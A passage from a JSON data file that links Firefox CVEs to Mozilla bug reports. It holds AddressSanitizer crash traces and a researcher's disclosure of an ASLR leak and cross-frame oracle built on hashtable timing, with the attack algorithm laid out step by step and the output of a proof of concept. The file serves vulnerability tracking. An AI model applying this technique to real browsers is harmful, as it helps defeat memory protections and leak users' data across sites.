SkLinearGradient::LinearGradientContext::shadeSpan(int, int, unsigned int*, int) /home/worker/workspace/build/src/gfx/skia/skia/src/effects/gradients/SkLinearGradient.cpp:280:9 #5 0x7f0a1f8152d4 in SkARGB32_Shader_Blitter::blitRect(int, int, int, int) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkBlitter_ARGB32.cpp:435:17 #6 0x7f0a1f86643f in antifilldot8(int, int, int, int, SkBlitter*, bool) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkScan_Antihair.cpp:678:17 #7 0x7f0a1f864c44 in antifillrect /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkScan_Antihair.cpp:692:5 #8 0x7f0a1f864c44 in antifillrect /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkScan_Antihair.cpp:765 #9 0x7f0a1f864c44 in SkScan::AntiFillRect(SkRect const&, SkRegion const*, SkBlitter*) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkScan_Antihair.cpp:788 #10 0x7f0a1f86508f in SkScan::AntiFillRect(SkRect const&, SkRasterClip const&, SkBlitter*) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkScan_Antihair.cpp:807:9 #11 0x7f0a1fd03658 in SkDraw::drawRect(SkRect const&, SkPaint const&, SkMatrix const*, SkRect const*) const /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkDraw.cpp:877:21 #12 0x7f0a1fa48072 in SkCanvas::onDrawRect(SkRect const&, SkPaint const&) /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkCanvas.cpp:2109:9 #13 0x7f0a18029068 in mozilla::gfx::DrawTargetSkia::FillRect(mozilla::gfx::RectTyped<mozilla::gfx::UnknownUnits, float> const&, mozilla::gfx::Pattern const&, mozilla::gfx::DrawOptions const&) /home/worker/workspace/build/src/gfx/2d/DrawTargetSkia.cpp:668:3 #14 0x7f0a186a3a4e in gfxContext::FillAzure(mozilla::gfx::Pattern const&, float) /home/worker/workspace/build/src/gfx/thebes/gfxContext.cpp:1069:5 #15 0x7f0a186a3428 in gfxContext::Fill(mozilla::gfx::Pattern const&) /home/worker/workspace/build/src/gfx/thebes/gfxContext.cpp:200:3 #16 0x7f0a18698ab3 in gfxContext::Fill() /home/worker/workspace/build/src/gfx/thebes/gfxContext.cpp:192:3 #17 0x7f0a1d1514d5 in nsCSSRendering::PaintGradient(nsPresContext*, nsRenderingContext&, nsStyleGradient*, nsRect const&, nsRect const&, nsRect const&, nsSize const&, mozilla::gfx::IntRectTyped<mozilla::CSSPixel> const&, nsSize const&) /home/worker/workspace/build/src/layout/base/nsCSSRendering.cpp:3026:7 #18 0x7f0a1d167c3b in nsImageRenderer::Draw(nsPresContext*, nsRenderingContext&, nsRect const&, nsRect const&, nsRect const&, nsPoint const&, nsSize const&, mozilla::gfx::IntRectTyped<mozilla::CSSPixel> const&) /home/worker/workspace/build/src/layout/base/nsCSSRendering.cpp:5472:7 #19 0x7f0a1d145f7a in DrawBackground /home/worker/workspace/build/src/layout/base/nsCSSRendering.cpp:5574:10 . . . AddressSanitizer can not provide additional info. SUMMARY: AddressSanitizer: SEGV /home/worker/workspace/build/src/gfx/skia/skia/src/core/SkUtils.h:31:19 in sk_memset32 ==30297==ABORTING"
      }
    ],
    "CVE-2017-5378": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1330769",
        "title": "ASLR leak via pointer scrambling in ShapeTable",
        "description": "+++ This bug was initially created as a clone of Bug #1312001 +++ Bug 1312001 fixed many of the ASLR leak issues, but ShapeTable still has similar issues that need fixing."
      },
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1312001",
        "title": "ASLR leak and cross-frame oracle via pointer scrambling in Map/Set",
        "description": "User Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36 Steps to reproduce: In Nightly (non-debug build) on x86-64, open the file attack.html from the attached tarball and wait around 15 seconds (depending on your CPU) until the displayed result is green or red. For the second way to abuse the behavior described here, unpack leak_interned.html, an attacker, and leak_interned_victim.html, a victim page. This attack is less reliable. Open leak_interned.html in a fresh browser instance, click one of the three name buttons, click the \"tell me what I clicked button\", and then wait a couple seconds (I think you have to wait for a GC run to happen or so). Actual results: In the first PoC, something like this will be shown: bucket access delay calibration: hit: 0.014999999999993463, miss: 0, limit: 0.0074999999999967315 current char code: 41 number of possible results: 1 result: 0x01f00028 The displayed result (0x01f00028) is the pointer to the atomized string corresponding to '\\0', truncated to 32 bits. On Linux, the corresponding mapping is visible in /proc/<plugin-container-pid>/maps: 7f3001400000-7f3002000000 rw-p 00000000 00:00 0 The basic idea here is to perform a hash DoS attack, but with a goal other than Denial of Service. After a single hashtable bucket has been filled with lots of entries, insertions and negative lookups on the hashtable will be much slower for keys that map to the filled hashmap bucket. This means that a timing measurement can be used to determine whether a given key maps to a specific hashtable bucket as follows: - Fill the hashtable bucket with data. - Measure the time needed to look up the key in the hashtable. Filling a specific hashtable bucket with data is easy because: - int32 numbers are simply mapped with ScrambleHashCode(number), no unknown values are involved - the inverse of ScrambleHashCode() is just a modular multiplication with the multiplicative inverse of the constant scrambling factor, so it is possible to compute a series of int32 numbers that map to adjacent hash codes. The reason this can be used to break ASLR is that, for strings and objects, 32-bit truncated pointers are scrambled with ScrambleHashCode() and then used to derive hashmap bucket indexes. Therefore, by measuring lookup times for strings/objects in a hashmap with a known filled bucket, the range of possible pointers can be constrained. Strings are converted to pointers by atomizing (interning) them, then taking the pointer to the atom. For some strings, atoms are precreated; in particular, atoms exist for single-character strings with charcodes 0-255. Because these are allocated in a loop during runtime initialization (StaticStrings::init()), they form a sequence in memory, so the distance between the atomized strings for String.fromCharCode(i) and String.fromCharCode(i+1) (for i in range(0,255)) is always 0x18. The algorithm used in the PoC works roughly as follows (this is just the basic idea, the implementation in the exploit is optimized a bit): find_bucket_precise() attempts to find the bucket index at which a given value will be placed in a Set of size 2^22. This is done as follows: - Locate the value in a Set with 64 buckets (find_bucket64()) by testing with 64 different Set instances that have different filled buckets and checking with which Set the operation is slow - Repeatedly create new Sets with doubled bucket counts (128, 256, 512, ...) and test whether the access at the doubled old bucket index is slow. Basically, determine the 22-bit bucket index bit by bit. The main code attempts to find a single candidate for the address of the '\\0' atom: - Compute the bucket index of '\\0' with find_bucket_precise(). - Let candidates_set be the result of deriving 32-bit truncated pointer candidates from the bucket index of '\\0' using the inverse of ScrambleHashCode(). - For characters '\\1', '\\2', '\\3', ...: - Compute the character's bucket index with find_bucket_precise(). - Derive 32-bit truncated pointer candidates from the character's bucket index. - Let current_0candidates be the result of subtracting character_code*0x18 from the candidates for the current character. - Let candidates_set be the values that are contained in both candidates_set and current_0candidates. - Assert that candidates_set contains exactly one value. - Return the value in candidates_set. This is not just usable to break ASLR, as demonstrated by the second PoC. Another issue is that, because atoms are shared across frames, the ability to determine bucket indexes can be used to determine whether another frame is using an atom with specific contents (because an atom can only move in memory if nobody is using it). I'm not entirely sure, but I think string literals are always atomized? So this can e.g. be used to leak information like usernames embedded in JavaScript code across websites. The PoC determines which one out of a set of possible names was selected in the other frame across origins. Expected results: Firefox should not leak addresses or information about strings in other frames to JavaScript code. In V8, these attacks won't work because: Objects can have private, random 32-bit members (\"hash_code_symbol\") specifying their hashmap buckets. The member is set when the object is used in a hashtable the first time. Strings are not interned for usage in hashtables; instead, when a string is used in a hashtable for the first time, a hash of its contents is computed and stored in the string by String::ComputeAndSetHash(). It might make sense to copy V8's behavior here. This bug is subject to a 90 day disclosure deadline. If 90 days elapse without a broadly available patch, I will post it publicly."
      }
    ],
    "CVE-2017-5379": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1309198",
        "title": "heap-use-after-free in mozilla::dom::Element::GetAnimations",
        "description": "The attached testcases crashes the latest ASAN build of Firefox (BuildID=20161010095556) as follows. It requires Jesse's fuzzPriv extension to reproduce reliably. ASAN output: ================================================================= ==936==ERROR: AddressSanitizer: heap-use-after-free on address 0x60f0000a6318 at pc 0x7f16979d2e9f bp 0x7ffc3623fcb0 sp 0x7ffc3623fca8 READ of size 4 at 0x60f0000a6318 thread T0 (Web Content) #0 0x7f16979d2e9e in HasFlag /home/worker/workspace/build/src/dom/base/nsWrapperCache.h:210:15 #1 0x7f16979d2e9e in IsRootOfNativeAnonymousSubtree /home/worker/workspace/build/src/dom/base/nsIContent.h:174 #2 0x7f16979d2e9e in IsGeneratedContentContainerForBefore /home/worker/workspace/build/src/dom/base/nsIContent.h:332 #3 0x7f16979d2e9e in mozilla::dom::Element::GetAnimations(mozilla::dom::AnimationFilter const&, nsTArray<RefPtr<mozilla::dom::Animation> >&) /home/worker/workspace/build/src/dom/base/Element.cpp:3460 #4 0x7f1697bb046b in nsDocument::GetAnimations(nsTArray<RefPtr<mozilla::dom::Animation> >&) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:3032:3 #5 0x7f169956d2c8 in mozilla::dom::DocumentBinding::getAnimations(JSContext*, JS::Handle<JSObject*>, nsIDocument*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/DocumentBinding.cpp:4247:3 #6 0x7f16999f6460 in mozilla::dom::GenericBindingMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/dom/bindings/BindingUtils.cpp:2825:13 #7 0x7f169fc301a5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #8 0x7f169fc301a5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #9 0x7f169fc30e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:10 #10 0x7f169fa519bc in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #11 0x7f169f99b92f in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #12 0x7f169f9a9c6f in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #13 0x7f169f9ac62e in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #14 0x7f169fc301a5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #15 0x7f169fc301a5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #16 0x7f169fc10956 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:509:12 #17 0x7f169fc10956 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #18 0x7f169fbf5c5b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #19 0x7f169fc3080f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:476:15 #20 0x7f169fc30e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:10 #21 0x7f169f7358cd in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2825:12 #22 0x7f1699527852 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:259:37 #23 0x7f1699e4ec41 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:361:12 #24 0x7f1699e4ec41 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:214 #25 0x7f1699e1af44 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1133:16 #26 0x7f1699e1c50f in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:17 #27 0x7f1699e06806 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #28 0x7f1699e0a86d in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 #29 0x7f169c080055 in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:998:7 #30 0x7f169cdfa1de in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7615:5 #31 0x7f169cdf5fb4 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7415:7 #32 0x7f169cdfd57f in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7312:13 #33 0x7f1696c786a0 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 #34 0x7f1696c77668 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:840:5 #35 0x7f1696c7441c in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:730:9 #36 0x7f1696c764f4 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #37 0x7f1696c7707c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #38 0x7f1695012f8b in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #39 0x7f1697bf360f in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8625:7 #40 0x7f1697ccb9ff in nsUnblockOnloadEvent::Run() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8578:5 #41 0x7f1694e3939d in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1082:7 #42 0x7f1694eb8c1c in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:290:10 #43 0x7f1695c1660f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #44 0x7f1695b883b8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #45 0x7f1695b883b8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #46 0x7f1695b883b8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #47 0x7f169b7aa46f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #48 0x7f169d9012c7 in XRE_RunAppShell /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:869:12 #49 0x7f1695b883b8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #50 0x7f1695b883b8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #51 0x7f1695b883b8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #52 0x7f169d900803 in XRE_InitChildProcess /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:701:7 #53 0x4dfb2b in content_process_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:197:19 #54 0x4dfb2b in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:392 #55 0x7f16b05b082f in __libc_start_main /build/glibc-GKVZIf/glibc-2.23/csu/../csu/libc-start.c:291 #56 0x41ba08 in _start (/home/nils/fuzzer3/firefox/firefox+0x41ba08) 0x60f0000a6318 is located 24 bytes inside of 176-byte region [0x60f0000a6300,0x60f0000a63b0) freed by thread T0 (Web Content) here: #0 0x4b215b in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7f1694d13574 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2665:9 #2 0x7f1694d13166 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2840:3 #3 0x7f1694d1985c in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3826:3 #4 0x7f1694d1903c in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3651:9 #5 0x7f1694d1c216 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4144:3 #6 0x7f1697cda939 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1440:3 #7 0x7f169782615d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1338:3 #8 0x7f1694e5fe36 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_x86_64_unix.cpp:180:23 #9 0x7f1696840cee in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2064:12 #10 0x7f1696840cee in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1383 #11 0x7f1696840cee in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1350 #12 0x7f169684847b in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:1143:12 #13 0x7f169fc301a5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7f169fc301a5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #15 0x7f169fc10956 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:509:12 #16 0x7f169fc10956 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #17 0x7f169fbf5c5b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #18 0x7f169fc3080f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:476:15 #19 0x7f169fc30e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:10 #20 0x7f169f732fdd in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2766:12 #21 0x7f1696779e2f in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:353:18 #22 0x7f169fc301a5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #23 0x7f169fc301a5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:446 #24 0x7f169fc10956 in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:509:12 #25 0x7f169fc10956 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #26 0x7f169fbf5c5b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #27 0x7f169fc3080f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:476:15 #28 0x7f169fc30e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:10 #29 0x7f169f7358cd in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2825:12 #30 0x7f1699529925 in mozilla::dom::OnErrorEventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::EventOrString const&, mozilla::dom::Optional<nsAString_internal> const&, mozilla::dom::Optional<unsigned int> const&, mozilla::dom::Optional<unsigned int> const&, mozilla::dom::Optional<JS::Handle<JS::Value> > const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/EventHandlerBinding.cpp:389:37 #31 0x7f1699e4f6a0 in Call<nsISupports *> /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/EventHandlerBinding.h:527:12 #32 0x7f1699e4f6a0 in mozilla::JSEventHandler::HandleEvent(nsIDOMEvent*) /home/worker/workspace/build/src/dom/events/JSEventHandler.cpp:166 #33 0x7f1699e1af44 in mozilla::EventListenerManager::HandleEventSubType(mozilla::EventListenerManager::Listener*, nsIDOMEvent*, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1133:16 #34 0x7f1699e1c50f in mozilla::EventListenerManager::HandleEventInternal(nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent**, mozilla::dom::EventTarget*, nsEventStatus*) /home/worker/workspace/build/src/dom/events/EventListenerManager.cpp:1286:17 #35 0x7f1699e06806 in mozilla::EventTargetChainItem::HandleEventTargetChain(nsTArray<mozilla::EventTargetChainItem>&, mozilla::EventChainPostVisitor&, mozilla::EventDispatchingCallback*, mozilla::ELMCreationDetector&) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:380:5 #36 0x7f1699e0a86d in mozilla::EventDispatcher::Dispatch(nsISupports*, nsPresContext*, mozilla::WidgetEvent*, nsIDOMEvent*, nsEventStatus*, mozilla::EventDispatchingCallback*, nsTArray<mozilla::dom::EventTarget*>*) /home/worker/workspace/build/src/dom/events/EventDispatcher.cpp:711:9 previously allocated by thread T0 (Web Content) here: #0 0x4b247b in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0d6d in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f169a146183 in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f169a146183 in NS_NewHTMLSharedElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLSharedElement.cpp:23 #4 0x7f169c898598 in NS_NewHTMLHtmlElement /home/worker/workspace/build/src/dom/html/nsGenericHTMLElement.h:1686:1 #5 0x7f169c898598 in nsContentDLF::CreateBlankDocument(nsILoadGroup*, nsIPrincipal*, nsIDocument**) /home/worker/workspace/build/src/layout/build/nsContentDLF.cpp:298 #6 0x7f169ce00306 in nsDocShell::CreateAboutBlankContentViewer(nsIPrincipal*, nsIURI*, bool) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:8075:5 #7 0x7f169cd9f9f3 in nsDocShell::EnsureContentViewer() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7965:17 #8 0x7f169cdd3687 in GetDocument /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4528:3 #9 0x7f169cdd3687 in non-virtual thunk to nsDocShell::GetDocument() /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:4526 #10 0x7f169786b8ed in MaybeCreateDoc /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:3633:38 #11 0x7f169786b8ed in GetDoc /home/worker/workspace/build/src/obj-firefox/dist/include/nsPIDOMWindow.h:181 #12 0x7f169786b8ed in EnsureInnerWindow /home/worker/workspace/build/src/obj-firefox/dist/include/nsPIDOMWindow.h:849 #13 0x7f169786b8ed in nsOuterWindowProxy::GetSubframeWindow(JSContext*, JS::Handle<JSObject*>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>, bool&) const /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:1063 #14 0x7f169786d2bc in nsOuterWindowProxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:1002:8 #15 0x7f169f9a761e in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:309:12 #16 0x7f169fa50d80 in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1497:16 #17 0x7f169fa50d80 in js::Wrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:143 #18 0x7f169f998f22 in js::CrossCompartmentWrapper::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:209:14 #19 0x7f169f9a761e in js::Proxy::get(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::Handle<jsid>, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:309:12 #20 0x7f169fca1d76 in GetProperty /home/worker/workspace/build/src/js/src/vm/NativeObject.h:1497:16 #21 0x7f169fca1d76 in js::GetElement(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, unsigned int, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsobjinlines.h:200 #22 0x7f169fc11ee9 in GetElement /home/worker/workspace/build/src/js/src/jsobjinlines.h:208:12 #23 0x7f169fc11ee9 in GetObjectElementOperation /home/worker/workspace/build/src/js/src/vm/Interpreter-inl.h:436 #24 0x7f169fc11ee9 in GetElementOperation /home/worker/workspace/build/src/js/src/vm/Interpreter-inl.h:563 #25 0x7f169fc11ee9 in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2760 #26 0x7f169fbf5c5b in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:404:12 #27 0x7f169fc3080f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:476:15 #28 0x7f169fc30e52 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:522:10 #29 0x7f169f7358cd in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2825:12 #30 0x7f1699527852 in mozilla::dom::EventHandlerNonNull::Call(JSContext*, JS::Handle<JS::Value>, mozilla::dom::Event&, JS::MutableHandle<JS::Value>, mozilla::ErrorResult&) 